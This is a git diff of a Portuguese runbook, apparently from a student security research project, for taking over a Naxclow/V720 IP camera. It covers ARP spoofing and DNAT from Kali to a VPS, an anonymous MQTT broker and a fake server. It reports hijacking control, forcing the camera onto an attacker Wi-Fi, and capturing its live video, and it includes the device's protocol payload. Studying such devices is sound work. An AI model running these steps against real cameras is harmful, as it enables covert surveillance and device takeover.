@@ -171,7 +171,10 @@ conjunto na **VPS** (IP público) e redireciona a câmera pra ela.
 ### VPS (IP público)
 
 1. Liberar no firewall/security-group: `80/tcp`, `1883/tcp`, `29940/tcp`, `29940/udp`.
-2. **Liberar a `:80`** — o fake HTTP responde nela. Se tiver nginx: `sudo systemctl stop nginx`.
+2. **Porta do fake HTTP:** a câmera bate na `:80`. Se a `:80` da VPS estiver **ocupada**
+   (nginx/docker), rode o fake em `8080` e informe a mesma porta no Kali via
+   `HTTP_DNAT_PORT=8080` (passo 5) — o DNAT reescreve `80 → 8080`. Só libere a `:80`
+   (`sudo systemctl stop nginx`) se ela estiver livre.
 3. Broker MQTT anônimo:
 
    ```
@@ -179,20 +182,25 @@ conjunto na **VPS** (IP público) e redireciona a câmera pra ela.
    mosquitto -c /tmp/mosq.conf -d
    ```
 
-4. Fake server (aponta pra si mesmo + broker local) — o `setwifi` sai pelo broker:
+4. Fake server (aponta pra si mesmo + broker local) — o `setwifi` sai pelo broker. Use
+   `--proxy-port 8080` se a `:80` estiver ocupada:
 
    ```
    cd /home/sentinela-tcc
    export FAKE_SRV_HOST=<vps> FAKE_SRV_RELAY_HOST=<vps> BROKER=127.0.0.1
-   .venv/bin/python src/a9_naxclow.py -s
+   .venv/bin/python src/a9_naxclow.py -s --proxy-port 8080
    ```
 
 ### Kali (mesma LAN)
 
-5. ARP spoof + DNAT de `80` + `1883` + relay pra **VPS** (modo combinado):
+5. ARP spoof + DNAT (`80`→fake, `1883`, relay) pra **VPS** (modo combinado):
 
    ```
-   sudo CAM_IP=<câmera> DNAT_MODE=all DNAT_TARGET=<vps> ./scripts/mitm_dns/mitm_dns.sh relay
+   export CAM_IP=<câmera>
+   export DNAT_MODE=all
+   export DNAT_TARGET=<vps>
+   export HTTP_DNAT_PORT=8080      # = mesma porta do --proxy-port do fake
+   sudo -E ./scripts/mitm_dns/mitm_dns.sh relay
    ```
 
 6. Conferir `ip_forward=1` e fazer **power-cycle** na câmera (pra ela refazer HTTP/MQTT).
@@ -210,11 +218,16 @@ conjunto na **VPS** (IP público) e redireciona a câmera pra ela.
 - **Sequestro de rede** (`setwifi`): a câmera reconecta na rede do atacante → **persistência**.
   Ressalva: a câmera precisa **alcançar** o SSID setado; senão cai no fallback de **AP aberto**.
 
-> **Status:** as duas metades estão **provadas separadamente** — controle por MQTT/DNS
-> ([achados_fakeserver](achados_fakeserver.md) + este runbook, Fase 4) e stream no relay
-> público ([achados_fakeserver_relay](achados_fakeserver_relay.md)). A **junção** (broker +
-> relay na VPS, DNS/DNAT → VPS) **ainda não foi executada numa sessão única** — é o próximo
-> passo natural (ver [`proximos_passos.md`](proximos_passos.md)).
+> **Status (executado 2026-11-03):** ✅ **controle + stream na mesma sessão.**
+> **Controle** — `ledei on/off` e `setwifi` funcionam (câmera no broker do atacante).
+> **Stream** — inicialmente o `240` do fake era recusado (`errStatus 2`). A **captura do `240`
+> real** (hotspot no Kali + `setwifi` pra mover a câmera pra lá) revelou o que faltava: o
+> payload real traz **`"tcpPort":<porta>` e `"uid":"<DEV>"`**, que o fake omitia. Corrigido em
+> `src/v720_http.py` — agora a câmera responde `errStatus 0`, **abre o relay**, e o fake serve
+> **vídeo real (640x480 JPEG)**.
+>
+> **Detalhe do `240` (confirmado no fio):**
+> `{"code":240,"tcpPort":29839,"uid":"<DEV>","domain":"v720.naxclow.com","host":"<relay>","pwd":"ef830de3","connectId":"<32hex>","userId":"<user>"}`
 
 ## Diagnóstico (árvore de decisão)
 
